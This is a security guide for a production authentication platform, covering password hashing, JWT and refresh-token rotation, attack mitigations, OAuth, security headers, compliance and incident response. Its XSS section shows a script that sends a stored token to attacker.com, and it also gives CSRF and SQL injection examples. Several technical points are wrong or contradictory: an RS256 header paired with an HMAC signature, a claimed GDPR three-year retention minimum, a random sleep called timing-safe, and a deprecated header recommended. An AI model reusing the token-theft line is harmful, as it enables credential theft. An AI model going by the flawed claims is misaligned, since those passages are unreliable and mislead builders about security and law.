# SECURITY DEEP DIVE
# Production Auth Platform

This document covers security considerations, threats, mitigations, and best practices.

---

## 1. PASSWORD SECURITY

### Hashing Algorithm: Argon2id

**Why Argon2id?**
- Resistant to GPU/ASIC attacks
- Memory-hard algorithm
- Modern best practice (winner of Password Hashing Competition 2015)

**Configuration:**
```
time_cost: 3 iterations
memory_cost: 65536 KB (64 MB per hash)
parallelism: 4 threads
hash_length: 32 bytes output
```

**Impact:**
- Each hash takes ~500ms on modern hardware
- Makes brute-force attacks impractical
- Example: 1 trillion guesses would take 15,000+ years

**Implementation:**
```typescript
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  timeCost: 3,
  memoryCost: 65536,
  parallelism: 4,
});
```

### Password Strength Requirements

```
Minimum: 8 characters
Must contain:
  - At least 1 uppercase letter (A-Z)
  - At least 1 lowercase letter (a-z)
  - At least 1 number (0-9)
  - At least 1 special character (!@#$%^&*)
```

**Examples:**
- ❌ `password` - Too simple, no uppercase/numbers/special
- ❌ `Password123` - Missing special character
- ✅ `SecurePass123!` - Meets all requirements
- ✅ `Tr0pic@lAuth2024` - Strong, memorable

### Password Hashing vs Encryption

```
Hashing (One-way):
  password → hash function → hash (can't reverse)
  
Use for: Password storage

Encryption (Two-way):
  plaintext → encrypt(key) → ciphertext
  ciphertext → decrypt(key) → plaintext
  
Use for: Sensitive data at rest (API keys, tokens)
```

---

## 2. TOKEN SECURITY

### JWT Structure

```
Header.Payload.Signature

Header:
{
  "alg": "RS256",
  "typ": "JWT"
}

Payload (Claims):
{
  "sub": "user-uuid",        // Subject (user ID)
  "app_id": "app-uuid",      // Tenant context
  "roles": ["admin"],        // App-scoped roles
  "device_id": "device-uuid",// Session tracking
  "iat": 1711515600,         // Issued at (seconds)
  "exp": 1711519200,         // Expires (15 min)
  "jti": "unique-id"         // JWT ID (revocation)
}

Signature:
HMACSHA256(base64url(Header) + "." + base64url(Payload), SECRET_KEY)
```

### Access Token Security

```
Characteristics:
- Short-lived: 15 minutes
- Lightweight: Small payload
- Signed: Cannot be tampered with
- Sent in Authorization header: Only with HTTPS
- Expires quickly: Minimal window if stolen

In Production:
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Refresh Token Security

```
Characteristics:
- Long-lived: 7 days
- Stored securely: HttpOnly cookie or encrypted storage
- Hashed in DB: Never stored in plaintext
- Rotated on use: New token issued on refresh
- Device-bound: Associated with session

Storage (Web):
Set-Cookie: refresh_token=ref_abc123; 
  HttpOnly;           // JS can't access
  Secure;             // HTTPS only
  SameSite=Strict;    // CSRF protection
  Max-Age=604800;     // 7 days

Storage (Mobile):
SecureStore.setItemAsync('refresh_token', token);
```

### Refresh Token Rotation

```
Threat: Token Theft
If refresh token is compromised, attacker can:
1. Get new access tokens
2. Impersonate user indefinitely

Solution: Token Rotation
1. Every refresh issues NEW refresh token
2. Old token is IMMEDIATELY revoked
3. If old token used → Potential breach detected

Implementation:
POST /auth/refresh
Body: { refresh_token: "old_token" }

Server:
1. Verify old_token signature
2. Check against DB hash
3. Verify not expired/revoked
4. Issue new token pair
5. Revoke old token
6. Return new pair

Client MUST:
1. Receive new refresh token
2. Update stored token
3. Use new token on next refresh
```

### Token Expiration Windows

```
Access Token: 15 minutes
Why short?
- Reduces window if token stolen
- Forces periodic refresh
- Client catches account compromise faster

Refresh Token: 7 days
Why longer?
- User doesn't login repeatedly
- More convenient
- Mitigated by rotation + revocation

Session Timeout: 30 days inactivity
Why?
- Auto-cleanup of stale sessions
- Memory efficiency
- Forces re-auth after long absence
```

---

## 3. ATTACK PREVENTION

### Brute-Force Attacks

**Threat:**
Attacker tries many password combinations to guess credentials

**Mitigations:**
```
1. Rate Limiting:
   - Max 5 login attempts per 15 minutes per email
   - Max 10 attempts per 15 minutes per IP
   - Geometric backoff (1s, 2s, 4s delay)

2. Account Lockout:
   - Lock after 5 failed attempts
   - Lockout duration: 15 minutes
   - Clear on successful login

3. Failed Attempt Tracking:
   - Store failed attempts in DB (audit)
   - Trigger email notification (suspicious activity)
   - Alert admin after threshold

Implementation (Redis):
INCR login_failures:email:user@example.com
EXPIRE login_failures:email:user@example.com 900  // 15 min
```

**Cost to Attacker:**
- 5 char password: ~3 seconds (very weak)
- 8 char password: ~5 years
- With rate limiting: ~25 years
- With lockout + notification: Impractical

### User Enumeration

**Threat:**
Attacker discovers which emails have accounts

**Attack:**
```
POST /auth/login
Response: "User not found"
→ Email doesn't have account

POST /auth/login with wrong password
Response: "Invalid credentials"
→ Email has account
```

**Mitigation:**
Return same response for all failures:
```
- "User not found" → "Invalid credentials"
- Both return: "Invalid email or password"
- Same HTTP status: 401
- Same response time: Add artificial delay
```

**Implementation:**
```typescript
// Always use same error message
if (!user || !passwordValid) {
  // Add timing-safe delay to defeat timing attacks
  await sleep(Math.random() * 100); // 0-100ms random
  throw new InvalidCredentialsError('Invalid email or password');
}
```

### Replay Attacks

**Threat:**
Attacker replays captured JWT token to impersonate user

**Mitigations:**
```
1. Token Expiration:
   - JWT expires in 15 minutes
   - Expired tokens rejected immediately

2. Token ID (jti):
   - Unique ID per token
   - Revoked tokens stored in Redis
   - Check: is jti in revocation list?

3. Device Binding:
   - JWT includes device_id
   - Session stores device_id
   - Must match for access

4. Signature Verification:
   - Verify token not tampered with
   - Signature fails if modified
   - Automatic rejection
```

### CSRF (Cross-Site Request Forgery)

**Threat:**
Malicious site tricks user into making unwanted request

**Example:**
```html
<!-- On evil.com -->
<img src="https://api.auth.com/v1/me/logout" />
<!-- Browser automatically includes credentials -->
```

**Mitigations:**
```
1. SameSite Cookies:
   Set-Cookie: token=abc; SameSite=Strict
   → Only sent to same-site requests
   → Cross-site requests blocked

2. Token in Header:
   - CORS XMLHttpRequest must include header
   - Same-origin policy prevents evil.com from setting header

3. Origin Validation:
   - Check Origin/Referer headers
   - Reject mismatched origins
```

### XSS (Cross-Site Scripting)

**Threat:**
Attacker injects JavaScript to steal tokens from DOM

**Attack:**
```html
<script>
fetch('https://attacker.com/steal?token=' + localStorage.token);
</script>
```

**Mitigations:**
```
1. HttpOnly Cookies:
   Set-Cookie: token=abc; HttpOnly
   → JavaScript can't access
   → Immune to XSS

2. Tokens in Authorization Header:
   - Not stored in DOM
   - Only sent with fetch/XMLHttpRequest
   - XSS can't easily access

3. Content Security Policy:
   Content-Security-Policy: 
     default-src 'self';
     script-src 'self';
   → Blocks inline scripts
   → Prevents injection

4. Input Sanitization:
   - Escape all user input
   - Use framework's built-in sanitization
   - Never use innerHTML with user data
```

### SQL Injection

**Threat:**
Attacker injects SQL to access database

**Example:**
```sql
SELECT * FROM users WHERE email = 'user@example.com' OR '1'='1'
```

**Mitigations:**
```
1. Parameterized Queries (TypeORM):
   ❌ Bad:
   query(`SELECT * FROM users WHERE email = '${email}'`)
   
   ✅ Good:
   repository.find({ where: { email } })
   → ORM automatically parameterizes

2. Type Validation:
   - Email must be string
   - Phone must match regex
   - Rejects unexpected types

3. ORM Protection:
   - TypeORM sanitizes all queries
   - Automatic SQL escaping
```

---

## 4. DATA PROTECTION

### Encryption at Rest

```
Sensitive Data:
- Refresh tokens (hashed)
- API keys (encrypted)
- Encryption keys (in vault)
- Database backups (encrypted)

Implementation:
const encrypted = encrypt(sensitiveData, encryptionKey);
const decrypted = decrypt(encrypted, encryptionKey);

Algorithm: AES-256-GCM
- Symmetric encryption (same key for encrypt/decrypt)
- Authenticated (detects tampering)
- 256-bit keys (256-bit security)
```

### Database Backup Strategy

```
Frequency: Daily backups
Retention: 30-day rolling window
Encryption: Encrypted backups
Storage: AWS S3, separate account
Replication: Multi-region backup

Recovery Time Objective (RTO): 1 hour
Recovery Point Objective (RPO): 24 hours
```

### Sensitive Data in Logs

```
❌ Never Log:
- Passwords
- Refresh tokens
- API keys
- Personally identifiable information (PII)
- Credit card numbers
- Health information

✅ Safe to Log:
- User ID (UUID)
- Event type (login, logout)
- Provider (email, sms, google)
- IP address (masked if possible)
- Status (success, failed)
- Timestamp

Implementation:
logger.info({
  event: 'user_login',
  user_id: userId,        // ✅ Safe
  provider: 'email',      // ✅ Safe
  ip_address: maskIp(ip), // ✅ Masked
  success: true,          // ✅ Safe
  // ❌ Never: password, token, ssn, card
});
```

---

## 5. OAUTH SECURITY

### Authorization Code Flow

```
1. Browser → App: "Login with Google"

2. App → Google: GET /oauth/authorize?
   redirect_uri=https://app.com/callback&
   client_id=xxx&
   scope=openid email profile

3. Google → Browser: User logs in, grants permission

4. Browser → App: GET /callback?code=ABC123

5. App → Google (Backend): POST /oauth/token
   code=ABC123&
   client_id=xxx&
   client_secret=yyy
   (secret sent backend-to-backend, not exposed to browser)

6. Google → App: {id_token, access_token, refresh_token}

7. App → Browser: Issue JWT, set session
```

**Why backend exchange?**
```
If front-end does token exchange:
1. Client ID sent to browser (compromised)
2. Attacker can impersonate app
3. Token exposed in browser history

Backend exchange:
1. Client secret never exposed to browser
2. Secret known only to app backend + Google
3. Browser only gets code (one-time use)
4. Code worthless without secret
```

### Apple Sign-In Specifics

```
Native iOS:
- Uses ASAuthorizationAppleIDProvider
- No web browser needed
- User can hide email (anonymous)
- Native device security

Web:
- OAuth code flow (same as Google)
- Can trigger native popup on iOS
- Requires HTTPS

Key Points:
- Apple provides signed JWT
- Verify signature with Apple's public key
- Extract user info from JWT claims
- Support anonymous users (no email)
```

---

## 6. NETWORK SECURITY

### HTTPS/TLS

```
Requirement: 100% HTTPS for production
Why:
- Protects tokens in transit
- Prevents Man-in-the-Middle attacks
- Encrypts all communication
- Required for secure cookies

Implementation:
- TLS 1.2+ only
- Strong ciphers (TLS_AES_256_GCM_SHA384)
- Certificate
 validation
- HSTS headers (enforce HTTPS)
```

### Security Headers

```
HTTP Response Headers:

1. HSTS (HTTP Strict-Transport-Security):
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   → Browser enforces HTTPS for 1 year

2. CSP (Content-Security-Policy):
   Content-Security-Policy: default-src 'self'; script-src 'self'
   → Only allows scripts from same origin

3. X-Content-Type-Options:
   X-Content-Type-Options: nosniff
   → Prevents MIME sniffing

4. X-Frame-Options:
   X-Frame-Options: DENY
   → Prevents clickjacking

5. X-XSS-Protection:
   X-XSS-Protection: 1; mode=block
   → Browser XSS filter enabled
```

### CORS Configuration

```
❌ Wrong (Too Permissive):
app.enableCors({
  origin: '*'  // Allows ANY origin
});

✅ Correct:
app.enableCors({
  origin: [
    'https://app.example.com',
    'https://www.example.com'
  ],
  credentials: true,          // Allow cookies
  methods: ['GET', 'POST'],   // Restrict methods
  allowedHeaders: [
    'Content-Type',
    'Authorization'
  ]
});
```

---

## 7. COMPLIANCE & AUDIT

### GDPR Compliance

```
User Rights:
1. Right to Access:
   GET /v1/me → Return all user data

2. Right to Erasure ("Right to be Forgotten"):
   DELETE /v1/me → Delete all data
   → Mark user.deleted_at
   → Cascade delete sessions, identities
   → Audit: log deletion

3. Right to Portability:
   GET /v1/me/export → Download all data

4. Data Breach Notification:
   → Notify users within 72 hours
   → Notify authorities if high risk
```

### Audit Logging Requirements

```
What to Log (Authentication):
- WHO: user_id, identity
- WHAT: login, logout, password_change
- WHEN: timestamp
- WHERE: ip_address, device_id, geolocation
- RESULT: success, failure, failure_reason

Retention:
- GDPR: Minimum 3 years
- PCI-DSS: 1 year minimum
- SOX: 7 years for public companies
- Local laws: Check jurisdiction

Immutability:
- Audit logs should not be editable
- Write-once database
- Store in dedicated audit table
```

### PCI-DSS (Payment Card Industry)

```
If handling payment cards:

1. Strong Authentication:
   ✅ Multi-factor authentication
   ✅ Strong passwords (we have this)

2. Vulnerability Management:
   ✅ Regular penetration testing
   ✅ Vulnerability scanning
   ✅ Patching critical issues

3. Access Control:
   ✅ Least privilege
   ✅ Role-based access
   ✅ Audit logging

4. Data Protection:
   ✅ Encryption at rest
   ✅ Encryption in transit
   ✅ No plaintext storage

Note: Don't store card data! Use payment processor.
```

---

## 8. SECURITY CHECKLIST

### Before Production Deployment

### Infrastructure
- [ ] HTTPS/TLS enabled (TLS 1.2+)
- [ ] Security headers configured
- [ ] CORS properly restricted
- [ ] Network firewall configured
- [ ] DDoS protection enabled
- [ ] WAF (Web Application Firewall) active

### Secrets Management
- [ ] JWT secret: 32+ random bytes
- [ ] OAuth secrets not in code
- [ ] Database passwords strong
- [ ] Encryption keys in vault
- [ ] No secrets in git history
- [ ] Environment variables configured

### Authentication
- [ ] Argon2 parameters correct
- [ ] Password validation enforced
- [ ] Rate limiting active
- [ ] Brute-force protection enabled
- [ ] Account lockout working
- [ ] User enumeration prevented

### Tokens
- [ ] Refresh token hashing enabled
- [ ] Token rotation working
- [ ] Revocation list functional
- [ ] HttpOnly + Secure + SameSite flags
- [ ] Expiration enforced
- [ ] Device binding working

### Data Protection
- [ ] Sensitive data encrypted at rest
- [ ] Database backups encrypted
- [ ] Audit logs secured
- [ ] PII not logged
- [ ] GDPR compliance implemented
- [ ] Data retention policies

### Monitoring
- [ ] Error tracking (Sentry)
- [ ] Performance monitoring (APM)
- [ ] Audit logs queryable
- [ ] Alerting configured
- [ ] Suspicious activity rules
- [ ] Failed login tracking

### Testing
- [ ] Security tests passing
- [ ] Penetration testing done
- [ ] Vulnerability scan clean
- [ ] Dependency audit clean
- [ ] Rate limiting tested
- [ ] Brute-force test passed

---

## 9. INCIDENT RESPONSE

### Potential Security Incidents

```
1. Data Breach (Database compromised):
   - Immediate: Rotate encryption keys
   - Day 1: Notify affected users
   - Day 1: Force password reset
   - Day 3: Notify regulators (if required)
   - Week 1: Complete forensics
   - Week 2: Publish postmortem

2. Account Takeover (Credentials leaked):
   - Immediate: Reset affected user accounts
   - Day 1: Notify users
   - Day 1: Send recovery email
   - Week 1: Analyze attack pattern

3. DoS Attack:
   - Immediate: Activate DDoS protection
   - Ongoing: Scale infrastructure
   - Post: Analyze traffic patterns
   - Update: Rate limiting rules

4. Ransomware:
   - Immediate: Isolate affected systems
   - Hour 1: Restore from backup
   - Day 1: Investigate extent
   - Week 1: Patch vulnerabilities
```

### Communication Plan

```
If Security Incident:

1. Notify:
   - CEO/Leadership
   - Legal team
   - Regulators (if required)
   - Customers (if data exposed)

2. Immediate Actions:
   - Contain damage
   - Preserve evidence
   - Document timeline

3. Communication:
   - Be transparent
   - Don't minimize
   - Provide remedy/next steps
   - Follow-up updates

4. Long-term:
   - Publish lessons learned
   - Update security practices
   - Implement preventive measures
```

---

## 10. CONTINUOUS SECURITY

### Regular Audits

```
Weekly:
- [ ] Review failed login attempts
- [ ] Check rate limit violations
- [ ] Monitor error logs
- [ ] Verify backups completed

Monthly:
- [ ] Security audit of code
- [ ] Dependency vulnerability scan
- [ ] Penetration testing (sample)
- [ ] Access control review

Quarterly:
- [ ] Full penetration test
- [ ] Security architecture review
- [ ] Compliance audit
- [ ] Team training

Annually:
- [ ] Third-party security audit
- [ ] Disaster recovery drill
- [ ] Policy updates
- [ ] Security certification
```

### Update Strategy

```
Dependencies:
- Monthly: Review updates
- Patch: Critical immediately
- Minor: Within 30 days
- Major: Evaluate before updating

OS/Runtime:
- Security patches: Immediate
- Minor updates: Monthly
- Major updates: Quarterly

Secrets Rotation:
- API keys: Every 90 days
- Database passwords: Every 6 months
- Encryption keys: If suspected leak
```

---

## Summary

| Layer | Threat | Mitigation |
|-------|--------|-----------|
| **Password** | Weak passwords, brute-force | Argon2, rate limiting, lockout |
| **Token** | Token theft, replay | Rotation, expiration, signing |
| **Network** | MITM, eavesdropping | HTTPS/TLS, secure headers |
| **API** | SQL injection, XSS | Parameterized queries, sanitization |
| **Data** | Breach, unauthorized access | Encryption, access control, audit logs |
| **Application** | Enumeration, CSRF | Same errors, cookies, origin check |

**Remember**: Security is defense in depth, not a single wall.
